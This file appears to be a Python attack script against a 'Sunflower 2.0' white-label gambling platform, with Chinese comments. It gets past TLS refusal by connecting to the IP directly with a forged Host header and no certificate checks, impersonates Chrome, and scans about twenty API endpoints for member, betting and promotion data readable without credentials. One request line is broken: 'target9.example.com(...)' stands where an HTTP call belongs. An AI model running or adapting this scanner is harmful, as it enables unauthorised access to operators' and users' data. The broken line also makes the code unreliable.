#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Sunflower 2.0 白标博彩系统 —— 未授权 API 读取 + TLS 拒绝绕过
实测：example.com (203.0.113.49)

【要点 1】该家族域名 TLS 被服务端主动断开，必须 IP 直连 + Host 头：
    ✗ https://sbweb-mlycdn-kube4.weicloud360.com/...  → SSL_connect: Connection closed abruptly
    ✗ http://...                                      → Empty reply from server
    ✓ https://<IP>/... + headers={"Host": "<域名>"} + verify=False → 200

【要点 2】业务 API 必须 POST + application/json：
    GET  /api/HomeV6/GetSP   → 405 Method Not Allowed
    POST /api/HomeV6/GetSP   → 200 + JSON 业务数据（无需任何凭据）

【要点 3】后端是 .NET：415 错误页带 RFC9110 语义 + traceId 格式 `00-<32hex>-<16hex>-00`

【要点 4】写接口返回成功码但为 no-op：UpdatePA/UpdateMP/UpdateRS/UpdateFBT/SBB 都返回
        200 {"StatusCode":202}，但回读验证状态未变更（依赖服务端 Session，无 Session 时不落库）
        → 因此实际危害是**未授权读取**，不是未授权写入。这是诚实结论。
"""
import json, sys
from curl_cffi import requests

HOST = "example.com"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/203.0.113.20 Safari/537.36")
BARE = {"User-Agent": UA, "Host": HOST, "Content-Type": "application/json"}
FALLBACK = 13694          # gocache SPA 兜底页长度，命中即代表路由不存在


def api(path, body=None, host=HOST, ip=None):
    """无凭据 POST + JSON 调业务 API。ip 非空时走 IP 直连 + Host 头。"""
    url = "https://%s%s" % (ip or host, path)
    h = dict(BARE)
    h["Host"] = host
    r = target9.example.com(url, headers=h, data=json.dumps(body if body is not None else {}),
                      timeout=20, impersonate="chrome", verify=False, allow_redirects=False)
    return r.status_code, r.content, dict(r.headers)


def fetch_static(host, ip, path):
    """用 IP 直连 + Host 头 取 CDN 静态资源"""
    h = {"User-Agent": UA, "Host": host}
    r = requests.get("https://%s%s" % (ip, path), headers=h, timeout=25,
                     impersonate="chrome", verify=False, allow_redirects=True)
    return r.status_code, r.content


READ_ENDPOINTS = [
    "/api/HomeV6/GetSP",                              # 站点档案（商户号/名称/币种/限额）
    "/api/AnnouncementV6/GetScrollingAnnouncement",   # 内部运营公告（56 条 / 16KB）
    "/api/AnnouncementV6/GetPA",
    "/api/MemberV6/GetMP",
    "/api/MemberV6/GetMB",
    "/api/SearchV6/GetRPS",
    "/api/HomeV6/GetSMC",
    "/api/HomeV6/GetSM",
    "/api/PlaceBetV6/GetBI",
    "/api/PlaceBetV6/GetRS",
    "/api/MyBetV6/GetBL",
    "/api/MyBetV6/GetBS",
    "/api/MyBetV6/GetPRC",
    "/api/PromotionV6/GetAP",
    "/api/PromotionV6/GetFBB",
    "/api/PromotionV6/GetHUNCF",
    "/api/PromotionV6/GetUDMC",
    "/api/PromotionV6/GetVDMR",
    "/api/EventV6/GetFE",
    "/api/ResultV6/GetGI",
]


def scan(host=HOST, ip=None):
    print("[*] target:", host, "(ip=%s)" % ip if ip else "")
    print("\n--- 未授权读接口 ---")
    for p in READ_ENDPOINTS:
        sc, c, h = api(p, {}, host=host, ip=ip)
        if sc == 200 and len(c) == FALLBACK:
            print("    [SPA兜底] %-50s" % p)
            continue
        tag = "  ★ 未授权可读" if sc == 200 else ""
        print("    [%s] %-50s len=%-7d%s" % (sc, p, len(c), tag))
        if sc == 200 and len(c) > 200:
            print("         %s" % c[:260].decode("utf-8", "replace").replace("\n", " "))


if __name__ == "__main__":
    scan(sys.argv[1] if len(sys.argv) > 1 else HOST)
